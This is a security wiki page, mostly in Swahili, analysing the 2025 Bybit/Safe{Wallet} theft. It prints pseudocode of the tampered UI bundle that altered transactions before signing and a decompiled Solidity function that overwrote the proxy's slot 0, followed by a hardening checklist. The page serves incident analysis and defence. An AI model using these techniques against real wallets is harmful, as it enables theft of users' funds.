# Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari

Mlolongo wa wizi wa cold-wallet uliunganisha **supply-chain compromise ya Safe{Wallet} web UI** na **on-chain delegatecall primitive iliyoandika upya implementation pointer ya proxy (slot 0)**. Mambo muhimu ya kuzingatia ni:

- Ikiwa dApp inaweza kuingiza code kwenye signing path, inaweza kumfanya signer kutoa **EIP-712 signature halali yenye fields zilizochaguliwa na attacker** huku ikirejesha data ya UI ya awali ili signers wengine wasitambue.
- Safe proxies huhifadhi `masterCopy` (implementation) kwenye **storage slot 0**. Delegatecall kwa contract inayoandika kwenye slot 0 kwa ufanisi “hu-upgrade” Safe kuwa attacker logic, na hivyo kumpa attacker control kamili wa wallet.

## Off-chain: Targeted signing mutation katika Safe{Wallet}

Safe bundle iliyotampered (`_app-*.js`) ililenga kwa kuchagua anwani maalum za Safe + signer. Logic iliyoingizwa ilitekelezwa mara moja kabla ya signing call:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Sifa za attack
- **Inayodhibitiwa na muktadha**: allowlists zilizowekwa moja kwa moja za Safes/signers wa mwathiriwa zilizuia noise na kupunguza detection.<sup>[[1]](#references)[[3]](#references)</sup>
- **Mabadiliko ya dakika ya mwisho**: fields (`to`, `data`, `operation`, gas) zilibadilishwa mara moja kabla ya `signTransaction`, kisha zikarudishwa, hivyo proposal payloads kwenye UI zilionekana salama huku signatures zikilingana na attacker payload.
- **EIP-712 opacity**: wallets zilionyesha structured data lakini haziku-decode nested calldata au kuonyesha wazi `operation = delegatecall`, hivyo message iliyobadilishwa ilisainiwa bila uelewa kamili.

### Umuhimu wa Gateway validation
Safe proposals hutumwa kwenye **Safe Client Gateway**. Kabla ya checks zilizoimarishwa, gateway ingeweza kukubali proposal ambayo `safeTxHash`/signature ililingana na fields tofauti na zile za JSON body ikiwa UI ilizibadilisha baada ya signing. Baada ya incident, gateway sasa hukataa proposals ambazo hash/signature hazilingani na transaction iliyowasilishwa. Uthibitishaji kama huu wa hash upande wa server unapaswa kutekelezwa kwenye API yoyote ya signing-orchestration.

### Mambo muhimu ya 2025 Bybit/Safe incident
- Uvujaji wa cold-wallet wa Bybit wa Februari 21, 2025 (~401k ETH) ulitumia pattern hiyo hiyo: Safe S3 bundle iliyocompromise iliwashwa tu kwa Bybit signers na kubadilisha `operation=0` → `1`, ikiielekeza `to` kwenye attacker contract iliyokuwa ime-deployiwa awali na kuandika kwenye slot 0.<sup>[[1]](#references)[[3]](#references)</sup>
- `_app-52c9031bfa03da47.js` iliyohifadhiwa kwenye Wayback inaonyesha logic iliyofungwa kwa Safe ya Bybit (`0x1db9…cf4`) na signer addresses, kisha mara moja ikarudishwa kwenye clean bundle dakika mbili baada ya execution, ikifuata hila ya “mutate → sign → restore”.<sup>[[1]](#references)[[2]](#references)</sup>
- Malicious contract (kwa mfano, `0x9622…c7242`) ilikuwa na functions rahisi `sweepETH/sweepERC20` pamoja na `transfer(address,uint256)` iliyoandika implementation slot. Utekelezaji wa `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` ulihamisha proxy implementation na kutoa full control.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: Delegatecall proxy takeover kupitia slot collision

Safe proxies huhifadhi `masterCopy` kwenye **storage slot 0** na ku-delegate logic yote kwake. Kwa sababu Safe inasaidia **`operation = 1` (delegatecall)**, signed transaction yoyote inaweza kuelekeza kwenye contract kiholela na kutekeleza code yake ndani ya storage context ya proxy.<sup>[[3]](#references)</sup>

Attacker contract iliiga ERC-20 `transfer(address,uint256)` lakini badala yake ikaandika `_to` kwenye slot 0:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Njia ya utekelezaji:<sup>[[1]](#references)[[3]](#references)</sup>
1. Victims husaini `execTransaction` yenye `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy huthibitisha signatures juu ya parameters hizi.
3. Proxy hufanya delegatecall ndani ya `attackerContract`; mwili wa `transfer` huandika slot 0.
4. Slot 0 (`masterCopy`) sasa inaelekeza kwenye logic inayodhibitiwa na attacker → **full wallet takeover and fund drain**.

### Maelezo ya Guard & version (post-incident hardening)
- Safes >= v1.3.0 zinaweza kusakinisha **Guard** ya kuzuia `delegatecall` au kutekeleza ACLs kwenye `to`/selectors; Bybit ilikuwa ikiendesha v1.1.1, kwa hiyo hakukuwa na Guard hook. Kuboresha contracts (na kuongeza tena owners) kunahitajika ili kupata control plane hii.

## Checklist ya detection & hardening

- **UI integrity**: pin JS assets / SRI; fuatilia bundle diffs; chukulia signing UI kuwa sehemu ya trust boundary.
- **Sign-time validation**: hardware wallets zenye **EIP-712 clear-signing**; onyesha wazi `operation` na decode nested calldata. Kataa signing wakati `operation = 1` isipokuwa policy inaruhusu.
- **Server-side hash checks**: gateways/services zinazo-relay proposals lazima zihesabu upya `safeTxHash` na zithibitishe kuwa signatures zinaendana na fields zilizowasilishwa.
- **Policy/allowlists**: preflight rules za `to`, selectors, asset types, na zizuie delegatecall isipokuwa kwenye flows zilizokaguliwa. Hitaji internal policy service kabla ya kubroadcast fully signed transactions.
- **Contract design**: epuka kuweka arbitrary delegatecall wazi kwenye multisig/treasury wallets isipokuwa ikiwa ni lazima kabisa. Weka upgrade pointers mbali na slot 0 au zilinde kwa explicit upgrade logic na access control.
- **Monitoring**: toa alert kwa delegatecall executions kutoka kwenye wallets zinazoshikilia treasury funds, na kwa proposals zinazobadilisha `operation` kutoka kwenye typical `call` patterns.

## References

- [1] [AnChain.AI forensic breakdown of the Bybit Safe exploit](https://www.anchain.ai/blog/bybit)
- [2] [Zero Hour Technology analysis of the Safe bundle compromise](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
